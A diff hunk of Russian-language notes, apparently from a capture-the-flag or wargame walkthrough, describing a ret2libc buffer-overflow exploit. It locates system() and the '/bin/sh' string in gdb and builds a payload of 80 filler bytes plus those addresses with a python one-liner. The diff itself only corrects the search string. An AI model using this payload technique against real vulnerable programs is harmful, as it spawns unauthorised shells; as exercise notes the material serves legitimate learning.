@@ -5,7 +5,7 @@
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 4. Находим адрес функции system,  info functions system
 0xf7e6aed0
-5. Находим адрес строки /bin/sh, запускаем программу через gdb,  info proc map -> find  0xf7e2b000, 0xf7fd0000, "bin/sh"
+5. Находим адрес строки /bin/sh, запускаем программу через gdb,  info proc map -> find  0xf7e2b000, 0xf7fd0000, "/bin/sh"
 0xf7f897ec
 5. Готовим payload. 80 символов offset, адрес функции и адрес /bin/sh, сохраним в /tmp/l1
 python -c  'print "dat_wil\n" + "X"*80 + "\xd0\xae\xe6\xf7" + "0000" + "\xec\x97\xf8\xf7"' > /tmp/l1
